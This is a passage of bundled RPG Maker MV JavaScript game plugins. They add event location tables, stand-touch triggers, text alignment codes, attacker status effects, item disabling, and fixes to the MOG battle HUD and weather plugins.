		if(s==arr.length) arr.rnd1().hidden=false;
	}
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc evt fast search table ((re-)created each frame) and evt trigger evt action on evt
 * @author agold404
 * @help algo.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Character.prototype;
p.frontPos=function(x,y){
	if(x===undefined) x=this.x;
	if(y===undefined) y=this.y;
	const d=this.direction();
	x = $gameMap.roundXWithDirection(x, d);
	y = $gameMap.roundYWithDirection(y, d);
	return {x:x,y:y};
};
p.jumpFront=function(dist){
	let dx=0,dy=0;
	if((dist|=0)){
		const xy=this.frontPos();
		dx+=(xy.x-this.x)*dist;
		dy+=(xy.y-this.y)*dist;
	}
	this.jump(dx,dy);
	return this;
};
p.jumpTo=function(x,y){ this.jump(x-this.x,y-this.y); return this; };
p.getPosKey=function(x,y){
	if(x===undefined) x=this.x;
	if(y===undefined) y=this.y;
	return $dataMap&&((y*$dataMap.width)<<1)+x;
};
}

{ const p=Game_Event.prototype;
(p.startEventAt=function f(x,y,p){
	const coords=$gameMap && $gameMap._events && $gameMap._events.coords;
	const arr=coords[p] && coords[p].get(this.getPosKey(x,y));
	if(arr) for(let x=0,info={strtByEvt:this._eventId};x!==arr.length;++x) if(this!==arr[x]) arr[x].start(info);
}).forEach=function(evt){ evt.start(this); };
k='moveStraight';
r=p[k]; (p[k]=function f(){
	const x=this.x,y=this.y;
	const rtv=f.ori.apply(this,arguments);
	if(this.isMovementSucceeded()){
		// edit location table of $gameMap
		if($gameMap){
			$gameMap.update_locTbl_delEvt_overall(this,x,y);
			$gameMap.update_locTbl_addEvt_overall(this);
		}
	}else{
		// touch front
		let x = $gameMap.roundXWithDirection(this.x, this.direction());
		let y = $gameMap.roundYWithDirection(this.y, this.direction());
		this.startEventAt(x,y,1);
	}
	return rtv;
}).ori=r;
k='update';
r=p[k]; (p[k]=function f(){
	const wasMoving=this.isMoving();
	const rtv=f.ori.apply(this,arguments);
	if(wasMoving&&!this.isMoving()){
		// touch here
		let x = this.x;
		let y = this.y;
		this.startEventAt(x,y,0);
	}
	return rtv;
}).ori=r;
p.isMultipleExecutable=function(){
	const evtd=this.event();
	return evtd && evtd.meta.multiexec;
};
p.isBlockingExecutable=function(){
	// using $gameMap._interpreter if no meta.nonblocking
	const evtd=this.event();
	return evtd && !evtd.meta.nonblocking;
};
k='initMembers';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	return rtv;
}).ori=r;
k='lock';
r=p[k]; (p[k]=function(){
	if(!this._locked){
		this._locked = true;
		this._prelockDirection = this.direction();
	}
	this.turnTowardCharacter($gameMap._events[this._strtMeta&&this._strtMeta.strtByEvt]||$gamePlayer);
}).ori=r;
k='start';
r=p[k]; (p[k]=function f(strtMeta){
	const isMul=this.isMultipleExecutable();
	if(!isMul&&this.isStarting()) return;
	this._strtMeta=strtMeta;
	const rtv=f.ori.apply(this,arguments);
	const isBlk=this.isBlockingExecutable();
	if(!isBlk){
		// use another interpreter
		this.clearStartingFlag();
		let itrp;
		if(isMul){
			if(!this._itrpv) this._itrpv=[];
			this._itrpv.push(itrp=new Game_Interpreter());
		}else{
			if(!this._itrp) this._itrp=new Game_Interpreter();
			if(!this._itrp.isRunning()) itrp=this._itrp;
		}
		if(itrp) itrp.setup(this.list(),this.eventId());
	}
	return rtv;
}).ori=r;
}

{ const p=Game_Map.prototype;
k='update_locTbl';
r=p[k]; (p[k]=function f(){
	const evts=this._events;
	if(evts){
		{ let s=evts._set; if(s) s.clear(); else s=evts._set=new Set(); }
		{
			let c=evts.coords,m; if(!c) c=evts.coords=[];
			for(let p=5;p-->=0;){
				m=evts.coords[p];
				if(m) m.clear();
				else m=evts.coords[p]=new Map();
			}
		}
		{ let nb=evts.nonblockings; if(nb) nb.length=0; else nb=evts.nonblockings=[]; }
		evts.forEach(f.forEach,this);
	}
}).ori=r;
(p[k].forEach=function(evt,i,a){ if(!evt) return;
	if(a._set) a._set.add(evt);
	this.update_locTbl_addEvt(evt,a.coords[-1]);
	const evtd=evt.event(); if(!evtd) return;
	const meta=evtd.meta;
	if(meta.strtByAny) this.update_locTbl_addEvt(evt,a.coords[evt._priorityType]);
	if(!evt.isBlockingExecutable()) a.nonblockings.push(evt);
});
k='update_locTbl_addEvt';
r=p[k]; (p[k]=function f(evt,coord){
	if(!coord) return;
	const key=evt.getPosKey();
	let arr=coord.get(key); if(!arr) coord.set(key,arr=[]);
	arr.uniquePush(evt);
}).ori=r;
k='update_locTbl_delEvt';
r=p[k]; (p[k]=function f(evt,coord,x,y){
	if(!coord) return;
	const key=evt.getPosKey(x,y);
	const arr=coord.get(key); if(!arr) return;
	arr.uniquePop(evt);
}).ori=r;
k='update_locTbl_chkEvtErr';
r=p[k]; (p[k]=function f(evt){
	return !this._events||this._events._set&&!this._events._set.has(evt);
}).ori=r;
k='update_locTbl_addEvt_overall';
r=p[k]; (p[k]=function f(evt){
	if(this.update_locTbl_chkEvtErr(evt)) return;
	this.update_locTbl_addEvt(evt,this._events.coords&&this._events.coords[-1]);
}).ori=r;
k='update_locTbl_delEvt_overall';
r=p[k]; (p[k]=function f(evt,x,y){
	if(this.update_locTbl_chkEvtErr(evt)) return;
	this.update_locTbl_delEvt(evt,this._events.coords&&this._events.coords[-1],x,y);
}).ori=r;
k='update';
r=p[k]; (p[k]=function f(){
	this.update_locTbl();
	return f.ori.apply(this,arguments);
}).ori=r;
k='updateInterpreter';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._events){ for(let x=0,arr=this._events.nonblockings,xs=arr.length;x!==xs;++x){
		let unlock;
		if(arr[x]._itrp && arr[x]._itrp.isRunning()){
			arr[x]._itrp.update();
			if(!arr[x]._itrp.isRunning()) unlock=true;
		}
		if(arr[x]._itrpv){ const newv=[]; for(let z=0,v=arr[x]._itrpv,zs=v.length;z!==zs;++z){
			if(v[z] && v[z].isRunning()){
				v[z].update();
				if(v[z].isRunning()) newv.push(v[z]);
			}
		} if(!(arr[x]._itrpv=newv).length) unlock=true; }
		if(unlock) arr[x].unlock();
	} }
	return rtv;
}).ori=r;
k='eventsXy';
r=p[k]; (p[k]=function f(x,y){
	const coord = this._events && this._events.coords && this._events.coords[-1] ;
	return coord&&coord.get(Game_Character.prototype.getPosKey(x,y))||f.tbl;
}).ori=r;
p[k].tbl=[];
k='eventsXyNt';
r=p[k]; (p[k]=function f(x,y){
	return this.eventsXy(x,y).filter(f.tbl);
}).ori=r;
p[k].tbl=e=>!e.isThrough();
}

{ const p=Game_Interpreter.prototype;
k='isOnCurrentMap';
r=p[k]; (p[k]=function f(){
	return $gameMap && f.ori.apply(this,arguments);
}).ori=r;
k='clear';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._strtMeta=undefined;
	return rtv;
}).ori=r;
k='terminate';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._strtMeta=undefined;
	return rtv;
}).ori=r;
k='setup';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const evt=$gameMap._events[this._eventId];
	if(evt) this._strtMeta=evt._strtMeta;
	return rtv;
}).ori=r;
k='character';
r=p[k]; (p[k]=function f(){
	return arguments[0]===-2&&this._strtMeta&&this._strtMeta.strtByEvt&&this.isOnCurrentMap()&&$gameMap._events[this._strtMeta.strtByEvt]||f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc Let player trigger events (whose priorities are not "Normal") which is overlapped by player. If stand still, trigger it again after the event is done.
 * @author agold404
 * @help use <standTouch> in note of event to specify this event will be triggered automatically
 * use <standTouchZ> in note of event to specify this event will be triggered when user press 'Ok'.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Event.prototype;
p.isNonNormalStandTouch =function(){
	const evtd=this.event();
	return evtd && evtd.meta.standTouch  && !this.isNormalPriority();
};
p.isNonNormalStandTouchZ=function(){
	const evtd=this.event();
	return evtd && evtd.meta.standTouchZ && !this.isNormalPriority();
};
}

{ const p=Game_Map.prototype;
(p.eventsXyNnst=function f(x,y){
	return this.eventsXy(x,y).filter(f.tbl);
}).tbl=e=>e.isNonNormalStandTouch();
(p.eventsXyNnstz=function f(x,y){
	return this.eventsXy(x,y).filter(f.tbl);
}).tbl=e=>e.isNonNormalStandTouchZ();
}

{ const p=Game_Player.prototype;
(p.checkEventNonNormalStandTouch_=function f(press){
	// edit from: checkEventTriggerHere
	if (this.canStartLocalEvents()) {
		// this.startMapEvent(this.x, this.y, triggers, false);
		//  but only non-normal stand touch   (<standTouch> )
		if(!$gameMap.isEventRunning()){
			(press?$gameMap.eventsXyNnstz(this.x, this.y):$gameMap.eventsXyNnst(this.x, this.y)).forEach(f.forEach);
		}
	}
}).forEach=evt=>evt.start();
t=evt=>evt.start();
p.checkEventNonNormalStandTouch=function f(){ return this.checkEventNonNormalStandTouch_(false); };
p.checkEventNonNormalStandTouchZ=function f(){ return this.checkEventNonNormalStandTouch_(true); };
k='triggerButtonAction';
r=p[k]; (p[k]=function() {
	if (Input.isTriggered('ok')) {
		if (this.getOnOffVehicle()) {
			return true;
		}
		this.checkEventTriggerHere([0]);
		if ($gameMap.setupStartingEvent()) {
			return true;
		}
		this.checkEventNonNormalStandTouchZ();
		if ($gameMap.setupStartingEvent()) {
			return true;
		}
		this.checkEventTriggerThere([0,1,2]);
		if ($gameMap.setupStartingEvent()) {
			return true;
		}
	}
	return false;
}).ori=r;
k='triggerTouchActionD1';
r=p[k]; (p[k]=function f(x1,y1){
	if ($gameMap.airship().pos(x1, y1)) {
		if (TouchInput.isTriggered() && this.getOnOffVehicle()) {
			return true;
		}
	}
	this.checkEventTriggerHere([0]);
	if($gameMap.setupStartingEvent()) return true;
	this.checkEventNonNormalStandTouchZ();
	return $gameMap.setupStartingEvent();
}).ori=r;
k='updateNonmoving';
r=p[k]; (p[k]=function f(wasMoving){
	if (!$gameMap.isEventRunning()) {
		if (wasMoving) {
			$gameParty.onPlayerWalk();
			this.checkEventTriggerHere([1,2]);
			if ($gameMap.setupStartingEvent()) {
				return;
			}
		}
		this.checkEventNonNormalStandTouch();
		if (this.triggerAction()) {
			return;
		}
		if (wasMoving) {
			this.updateEncounterCount();
		} else {
			$gameTemp.clearDestination();
		}
	}
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 文字置左/中/右
 * @author agold404
 * @help \TXTLEFT:"..." \TXTCENTER:"..." \TXTRIGHT:"..."
 * cursor will be at the end of the text in the double qoutes
 * use '\\' to indicate backslash (without quotes)
 * use '\"' to indicate a double qoute (without quotes)
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw_l="TXTLEFT";
const kw_c="TXTCENTER";
const kw_r="TXTRIGHT";
const re=/^:"(\\.|[^\\"\n])*"/g; // not used

[Window_Base,].forEach(a=>{ const p=a.prototype;
k='processNormalCharacter';
r=p[k]; (p[k]=function f(ts){
	if(this._CENTERTEXT_stat===ts.index){
		this._CENTERTEXT_stat=undefined;
		++ts.index;
		return this.processCharacter(ts);
	}
	return f.ori.apply(this,arguments);
}).ori=r;
});
{ const p=Window_Base.prototype;
t=p._textloc_measureWidth=function f(ts,ende){
	let t=Window_Base._tmp_drawTextEx;
	if(!t){
		(t=Window_Base._tmp_drawTextEx=new Window_Base(0,0,2048,64))._textloc_disabled=true;
		t.standardFontSize=f.tbl[0];
		t.standardFontFace=f.tbl[1];
	}
	t._ref=this;
	let ts2={};
	t.drawTextEx(ts.text.slice(ts.index,ende),0,0,undefined,undefined,ts2);
	return ts2.maxX;
};
t.ori=undefined;
t.tbl=[
function(){ return this._ref.contents.fontSize; },
function(){ return this._ref.contents.fontFace; },
];
k='processEscapeCharacter';
r=p[k]; (p[k]=function f(code,ts){ if(this._textloc_disabled) return f.ori.apply(this,arguments);
	if(this._CENTERTEXT_stat){
		if(ts.text[ts.index]==='"') return this.processNormalCharacter(ts);
		return f.ori.apply(this,arguments);
	}
	const alignIdx=f.tbl.kwm.get(code);
	if(alignIdx>=0 && ts.text[ts.index]===":"){
		// check double quotes
		const errmsg="\\"+code+' should start with \'"\' and end with \'"\' without a backslash in front of it.';
		let ok=0;
		if(ts.text[ts.index+1]==='"'){ for(let c,x=ts.index+2,xs=ts.text.length;x<xs;++x){
			c=ts.text[x];
			if(c===f.tbl.esc) ++x;
			else if(c==='\n') break;
			else if(c==='"'){ ok=x; break; }
		} }
		if(!ok) throw new Error(errmsg);
		this._CENTERTEXT_stat=ok;
		ts.index+=2;
		f.tbl.setLocv[alignIdx].call(this,ts,ok);
	}else return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl={
	esc:'\x1b',
	kwm:new Map([kw_l,kw_c,kw_r].map((kw,i)=>[kw,i])),
	re:re, // not used
setLocv:[
function(ts){ ts.x=ts.left; },
function(ts,ende){ ts.x=(this.contentsWidth()-this._textloc_measureWidth(ts,ende))/2; },
function(ts,ende){ ts.x=this.contentsWidth()-this._textloc_measureWidth(ts,ende)-1; },
],
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 受擊時此次攻擊者會被增加狀態
 * @author agold404
 * @help all (built-in) trait-available things, note: <addStatToSubject:[[id1,p1],[id2,p2], ... ]>
 * p是機率0~1，全部相加。或填負數扣到<=0使其不會發生。不填機率時當作1，填入非數字則當0。
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw='addStatToSubject';
const kwt='TRAIT_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	if(dataobj.meta[kw]) for(let x=0,arr=JSON.parse(dataobj.meta[kw]);x!==arr.length;++x){
		const id=arr[x][0]-0,p=arr[x][1];
		if(id) dataobj.traits.push({code:gbb[kwt],dataId:id,value:arr[x].length>1?p-0||0:1,});
	}
};
}

{ const p=Game_Battler.prototype;
(p[kw]=function f(){
	const m=new Map(); (m._arr=[])._map=m;
	this.traits(gbb[kwt]).forEach(f.forEach,m);
	return m._arr;
}).forEach=function(t){
	if(!this.has(t.dataId)) this._arr.push(t.dataId);
	this.set(t.dataId,(this.get(t.dataId)||0)+t.value);
};
}

{ const p=Game_Action.prototype;
k='executeDamage';
r=p[k]; (p[k]=function f(trgt,val){
	const rtv=f.ori.apply(this,arguments);
	if(!this.isRecover()){
		const arr=trgt[kw]();
		if(arr.length) arr.forEach(f.forEach,this.subject());
	}
	return rtv;
}).ori=r;
p[k].forEach=function(id,i,arr){ if(Math.random()<arr._map.get(id)) this.addState(id); };
}

})();


﻿"use strict";
/*:
 * @plugindesc WTF MOG
 * @author agold404
 * @help 
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Battle_Hud!=='undefined')(()=>{ let k,r,t;

{ const p=Battle_Hud.prototype;
k='create_states';
r=p[k]; (p[k]=function f(){
	if (String(Moghunter.bhud_states_visible) != "true") return;
	this.removeChild(this._state_icon);
	if (!this._battler) return;
	this._states_data = [0, 0, 0];
	const r = this._state_icon = new Window_Help(1), p=r.standardPadding();
	r.width  = Window_Base._iconWidth  + (p<<1) + 1;
	r.height = Window_Base._iconHeight + (p<<1) + 1;
	r.x = this._pos_x + Moghunter.bhud_states_pos_x - p;
	r.y = this._pos_y + Moghunter.bhud_states_pos_y - p;
	r.visible=false;
	r.setBackgroundType(2);
	this.addChild(r);
	this.refresh_states();
}).ori=r;
k='refresh_states';
r=p[k]; (p[k]=function f(lastStrt){
	if(!f._actor){
		f._actor=Object.create(Game_Actor.prototype);
		f._actor.initialize(1);
	}
	this._states_data[0] = 0;
	this._states_data[2] = 0;
	this._state_icon.visible = false;
	const stats=this._battler.states();
	const buffs=this._battler._buffs;
	if (stats.length === 0 && !buffs.some(Number)) {
		this._states_data[1] = 0;
		return;
	}
	
	const strt=this._states_data[1],ende=stats.length+buffs.length;
	let drawIt=false;
	if(!drawIt){
		for(;this._states_data[1]<stats.length;++this._states_data[1]){
			if(lastStrt===this._states_data[1]) return;
			const stat=stats[this._states_data[1]];
			if(!stat.iconIndex) continue;
			f._actor._states=[stat.id];
			(f._actor._stateTurns={})[stat.id]=this._battler.stateTurns(stat.id);
			drawIt=true;
			break;
		}
	}
	if(!drawIt){
		f._actor._states.length=0;
		f._actor.clearBuffs();
		for(let i=this._states_data[1]-stats.length;i<buffs.length;++i,++this._states_data[1]){
			if(lastStrt===this._states_data[1]) return;
			if(!buffs[i]) continue;
			f._actor._buffs[i]=this._battler._buffs[i];
			f._actor._buffTurns[i]=this._battler._buffTurns[i];
			drawIt=true;
			break;
		}
	}
	
	if(drawIt){
		const r=this._state_icon;
		r.visible=true;
		r.contents.clear();
		if(f.hasYEP===undefined) f.hasYEP=(typeof Yanfly!=='undefined')&&Yanfly.BSC&&Yanfly.BSC.Window_Base_drawActorIcons;
		if(f.hasYEP) f._actor.refresh();
		r.drawActorIcons(f._actor,0,0,Window_Base._iconWidth);
		this._battler.need_refresh_bhud_states=false;
	}else if(strt && !lastStrt){
		this._states_data[1]=0;
		return f.call(this,strt);
	}
	
	this._states_data[1] += 1;
	if (this._states_data[1] >= ende) this._states_data[1] = 0;
	return drawIt;
}).ori=r;
p[k].hasYEP=undefined;
}

})();


﻿"use strict";
/*:
 * @plugindesc disable item usage
 * @author agold404
 * @help with traits, note:
 * <disableItem>
 *  // lv = 1
 * <disableItem:lv>
 *  // lv <= 0 will be no effect
 * block item usage with disabledLv < lv
 *
 * item note:
 * <disabledLv:lv>
 *  // default = 0
 *  // lv <0 will be disabled for ever
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw='disableItem';
const kwt='TRAIT_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	$dataItems.forEach(f.tbl);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const val=dataobj.meta[kw]-0;
	if(val){
		dataobj.traits.push({code:gbb[kwt],dataId:val,value:0,}); // use traitsSet(code)
	}
};
p[k].tbl=dataobj=>{ if(!dataobj) return;
	dataobj.disabledLv = dataobj.meta.disabledLv|0;
};
}

{ const p=gbb.prototype;
p.getDisableItemLvEnd=function(){
	const arr=this.traitsSet(gbb[kwt]).slice();
	arr.push(0);
	return Math.max.apply(null,arr);
};
k='meetsItemConditions';
r=p[k]; (p[k]=function f(item){
	return f.ori.apply(this,arguments) && item.disabledLv>=this.getDisableItemLvEnd();
}).ori=r;
}

{ const p=Window_BattleItem.prototype;
k='includes';
r=p[k]; (p[k]=function f(item){
	return item && Game_BattlerBase.prototype.isOccasionOk.call(this,item);
}).ori=r;
k='isEnabled';
r=p[k]; (p[k]=function f(item){
	return this._actor?this._actor.canUse(item):f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Window_ActorCommand.prototype;
k='callHandler';
r=p[k]; (p[k]=function f(symbol){
	if(this.isHandled(symbol)){
		this._handlers[symbol](this._actor);
	}
}).ori=r;
}

{ const p=Scene_Battle.prototype;
k='commandItem';
r=p[k]; (p[k]=function f(actor){
	this._itemWindow._actor=actor;
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 垃圾MOG天氣效果沒有調整落葉吹的方向
 * @author agold404
 * @help ㄇㄉMOG就糞扣，3小js格式
 * 
 * This plugin can be renamed as you want.
 */

if(typeof SpriteWeatherEX!=='undefined')(()=>{ let k,r,t;

{ const p=Game_System.prototype;
k='commandSetupWeather';
r=p[k]; (p[k]=function f(args){
	const dir=args[0]&&args[0].slice(0,3)==="dir"&&Number(args[0].slice(3))||undefined;
	
	const id         = args[1]-0||0;
	const mode       = args[3]-0||0;
	const power      = isNaN(args[ 5])?1   :args[5]-0;
	const speed      = isNaN(args[ 7])?100 :args[7]-0;
	const blendType  = args[9]-0||0;
	const fileName   = String(args[11]||"");
	const z          = isNaN(args[13])?1:args[13]-0;
	const scale      = isNaN(args[15])?100 :args[15]-0;
	const frame      = isNaN(args[17])?1   :args[17]-0;
	const frameSpeed = isNaN(args[19])?10   :args[19]-0;
	
	const id_Real =  id;
	const mode_Real = Math.min(Math.max(mode, 0),35);
	const power_Real = Math.max(power, 1);
	const z_Real = Math.min(Math.max(z, 0),2); 
	const blendType_Real = Math.min(Math.max(blendType, 0),2);
	const scale_Real = scale;
	const speed_Real = speed;
	const frame_Real = Math.min(Math.max(frame, 1),100);
	const frame_Speed = Math.min(Math.max(frameSpeed, 0),1000);
	
	let arr=this._weatherEX_Data; if(!arr) arr=this._weatherEX_Data=[];
	if(!arr[id_Real]) arr[id_Real]={};
	arr[id_Real]._dir=dir;
	arr[id_Real].mode = mode_Real;
	arr[id_Real].power = power_Real;
	arr[id_Real].z = z_Real;
	arr[id_Real].blendMode = blendType_Real;
	arr[id_Real].fileName = fileName;
	arr[id_Real].speed = speed_Real;
	arr[id_Real].scale = scale_Real;
	arr[id_Real].frames = frame_Real;
	arr[id_Real].frameSpeed = frame_Speed;
	arr[id_Real].needRefresh = true;
	this._needRefreshWeatherEX = true;
	
	return arr[id_Real];
}).ori=r;
}

{ const p=SpriteWeatherEX.prototype;
k='createSprites';
r=p[k]; (p[k]=function f(sp){
	this._globalSpeed={x:0,y:0,};
	return f.ori.apply(this,arguments);
}).ori=r;
k='refreshWeather';
r=p[k]; (p[k]=function f(sp){
	sp._sy=sp._sx=0;
	
//	window._isMyFunc=false; // debug
	
	const rtv=f.ori.apply(this,arguments);
	
if(0){	 // debug
	if(!window.log_new) window.log_new={minX:Infinity,minY:Infinity, maxX:Infinity,maxY:-Infinity,cntX:[],cntY:[]};
	if(window._isMyFunc){ const obj=window.log_new,x=sp._realX,y=sp._realY;
	{const i=(x+128)>>6; obj.cntX[i]|=0; ++obj.cntX[i]; }
	{const i=(y+128)>>6; obj.cntY[i]|=0; ++obj.cntY[i]; }
	obj.minX=Math.min(obj.minX,x);
	obj.minY=Math.min(obj.minY,y);
	obj.maxX=Math.max(obj.maxX,x);
	obj.maxY=Math.max(obj.maxY,y);
	}
	window._isMyFunc=false;
}	 // debug
	
	const data=$gameSystem._weatherEX_Data&&$gameSystem._weatherEX_Data[this._id];
	const dir=data&&data._dir;
	const func=f.tbl[this._dir=dir]||f.tbl[6];
	func.call(this,sp);
	const gs=this._globalSpeed;
	sp._sx+=gs.x;
	sp._sy+=gs.y;
	return rtv;
}).ori=r;
(p[k].tbl=t=[
function rot(sp,rad,x,y,cx,cy){
	if(sp){
		const ox=this.screenX(),oy=this.screenY();
		const sxy=rot(0,rad,sp._sx,sp._sy),xy=rot(0,rad,sp._realX,sp._realY, ox+(Graphics.boxWidth  >>1) , oy+(Graphics.boxHeight >>1) );
		sp.x=(sp._realX=xy[0])-ox;
		sp.y=(sp._realY=xy[1])-oy;
		sp._sx=sxy[0];
		sp._sy=sxy[1];
		return;
	}
	cx=cx-0||0;
	cy=cy-0||0;
	x-=cx;
	y-=cy;
	const tblc=rot.tbl[0].c.get(rad),tbls=rot.tbl[0].s.get(rad);
	const c=tblc===undefined?Math.cos(rad):tblc,s=tbls===undefined?Math.sin(rad):tbls;
	return [x*c-y*s+cx,x*s+y*c+cy];
},
0,
function f(sp){
	// d2
	const rad=Math.PI/2;
	return f.tbl.call(this,sp,rad);
},
0,
function f(sp){
	// d4
	const rad=Math.PI;
	return f.tbl.call(this,sp,rad);
},
0,
function f(sp){
	// d6
	// default
},
0,
function f(sp){
	// d8
	const rad=Math.PI*3/2;
	return f.tbl.call(this,sp,rad);
},
]).map((f,i,a)=>i&&f&&(f.tbl=f.ori=a[0]));
t[0].ori=t[null]=t[undefined]=undefined;
t[0].tbl=[
{
c:new Map([
[Math.PI/2,0],
[Math.PI,-1],
[Math.PI*3/2,0],
]),s:new Map([
[Math.PI/2,1],
[Math.PI,0],
[Math.PI*3/2,-1],
]),
},
];
t=undefined;
new cfc(p).add('needRefreshWeather',function f(sp){
	if(this.needFixScreenMode()) return false;
	if(!f.t2){ f.t2={
		cM:Math.max(Graphics.boxWidth,Graphics.boxHeight),
		cx:Graphics.boxWidth>>1,
		cy:Graphics.boxHeight>>1,
	}; } // prevent changed during runtime
	const absdx=Math.abs((f.t2.cx-~~sp.x)/f.t2.cM),absdy=Math.abs((f.t2.cy-~~sp.y)/f.t2.cM);
	const rtv=1<absdx||1<absdy;
	if(rtv && this.mode()===19){
		if(!sp.alpha){
			sp._op=0;
			return true;
		}
		sp._op=f.tbl[0];
		return false;
	}
	return rtv;
},[
-32,
],false,true);
k='setPosLeft';
r=p[k]; (p[k]=function f(sp){
	const pos=Math.random(),canUpper=!f.tbl.nU.call(this);
	if(!f.tbl.pos0){ const g=Graphics; f.tbl.pos0=(Math.max(g.boxWidth,g.boxHeight)>>2)||64; }
	if(this.needRefrehLeft()) this.leftPos(sp,f.tbl.pos0);
	else if(this.needRefrehRight()){
		if(pos<0.3) this.rightPos(sp,-f.tbl.pos0);
		else this.leftPos(sp,40);
	}else if(this.needRefrehBottom()){
		if(pos<0.6)this.bottomPos(sp,-f.tbl.pos0);
		else this.leftPos(sp,f.tbl.pos0);
	}else{
		if(canUpper && pos<0.6) this.upperPos(sp,f.tbl.pos0);
		else this.leftPos(sp,f.tbl.pos0);
	}
}).ori=r;
p[k].tbl=t={
nU:function f(){ return f.tbl.has(this.mode()); },
};
t.nU.ori=undefined;
t.nU.tbl=new Set([1,2,22,]);
t=undefined;
}

})();


﻿"use strict";
/*:
 * @plugindesc radius wave effect
 * @author agold404
 * @help related part(s): 雜訊效果 ; Graphics.render ; Graphics.renderOtherEffects 
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Screen.prototype;
k='clear';
r=p[k]; (p[k]=function f(){
	this.radiusWaveEffect_clearAll();
	return f.ori.apply(this,arguments);
}).ori=r;
p.radiusWaveEffect_getArgvv=function(){
	let rtv=this._radiusWaveEffectArgvv;
	if(!rtv) rtv=this._radiusWaveEffectArgvv=[];
	return rtv;
};
p.radiusWaveEffect_get=function(id){
	return this.radiusWaveEffect_getArgvv()[id];
};
p.radiusWaveEffect_size=function(){
	return this.radiusWaveEffect_getArgvv().length;
};
p.radiusWaveEffect_push=function(argv){
	// argv: [
	// 	center_x_pixel , center_y_pixel ,
	// 	init_raduis_pixel , radius_inc_speed_pixel >= 1 , thickness_pixel >= 1 ,
	// 	curr_frames >=0 , total_inc_duration_in_frames >= 1 , fade_out_start_in_last_N_frames ,
	// 	pass2_arr_op_filled ,
	//	bool_allTheWay:noHole?
	// ]
	if(isNaN(argv[0])||isNaN(argv[1])) return;
	argv[0]|=0;
	argv[1]|=0;
	argv[2]|=0;
	if(isNaN(argv[3])) argv[3]=1;
	argv[3]|=0;
	if(!(argv[4]>=1)) argv[4]=1;
	argv[4]|=0;
	if(!(argv[5]>=0)) argv[5]=0;
	argv[5]|=0;
	if(!(argv[6]>=1)) argv[6]=1;
	argv[6]|=0;
	argv[7]|=0;
	return this.radiusWaveEffect_getArgvv().push(argv)-1;
};
p.radiusWaveEffect_clearAll=function(){
	this.radiusWaveEffect_getArgvv().length=0;
};
p.radiusWaveEffect_arrange=function(){
	// !!!! O(n) !!!!
	let cnt=0,arr=this._radiusWaveEffectArgvv;
	for(let x=0;x!==arr.length;++x){
		if(this._radiusWaveEffect_getRadiusInc(x)<0 && 0>=this.radiusWaveEffect_getRadius(x)) continue;
		if(this._radiusWaveEffect_getFramesCurr(x)<this._radiusWaveEffect_getFramesTotal(x)) arr[cnt++]=arr[x];
	}
	return arr.length=this._radiusWaveEffect=cnt;
};
p._radiusWaveEffect_setPos_x=function(id,val){
	return this.radiusWaveEffect_get(id)[0]=val;
};
p._radiusWaveEffect_setPos_y=function(id,val){
	return this.radiusWaveEffect_get(id)[1]=val;
};
p._radiusWaveEffect_setRadiusInit=function(id,val){
	return this.radiusWaveEffect_get(id)[2]=val;
};
p._radiusWaveEffect_setRadiusInc=function(id,val){
	return this.radiusWaveEffect_get(id)[3]=val;
};
p._radiusWaveEffect_setThickness=function(id,val){
	return this.radiusWaveEffect_get(id)[4]=val;
};
p._radiusWaveEffect_setFramesCurr=function(id,val){
	return this.radiusWaveEffect_get(id)[5]=val;
};
p._radiusWaveEffect_setFramesTotal=function(id,val){
	return this.radiusWaveEffect_get(id)[6]=val;
};
p._radiusWaveEffect_setFramesTotalFadeOut=function(id,val){
	return this.radiusWaveEffect_get(id)[7]=val;
};
p._radiusWaveEffect_setPass2=function(id,val){
	return this.radiusWaveEffect_get(id)[8]=val;
};
p._radiusWaveEffect_getPos_x=function(id){
	return this.radiusWaveEffect_get(id)[0];
};
